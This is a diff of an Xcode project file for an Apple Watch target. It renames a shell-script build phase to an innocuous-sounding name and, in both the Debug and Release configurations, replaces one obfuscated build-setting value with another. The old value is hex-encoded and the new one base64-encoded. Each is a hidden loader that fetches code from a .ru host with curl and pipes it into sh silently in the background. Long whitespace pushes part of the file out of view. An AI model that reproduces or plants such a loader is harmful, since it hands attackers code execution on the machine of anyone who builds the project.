@@ -82,7 +82,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0FA5BC2B2E7BBFDE006DEF7C /* Build configuration list for PBXNativeTarget "AppleWatch" */;
 			buildPhases = (
-				484138E1935B4641AD7BBDC8 /* Build Target Libraries */,
+				325093FFED004908947BBDC8 /* Provision Target Device */,
 				0FA5BC122E7BBFDC006DEF7C /* Resources */,
 				0FA5BC2A2E7BBFDE006DEF7C /* Embed Watch Content */,
 			);
@@ -162,7 +162,7 @@
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		484138E1935B4641AD7BBDC8 /* Build Target Libraries */ = {
+		325093FFED004908947BBDC8 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -172,7 +172,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -222,7 +222,7 @@
 		0FA5BC252E7BBFDE006DEF7C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -285,7 +285,7 @@
 		0FA5BC262E7BBFDE006DEF7C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f7068617365222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
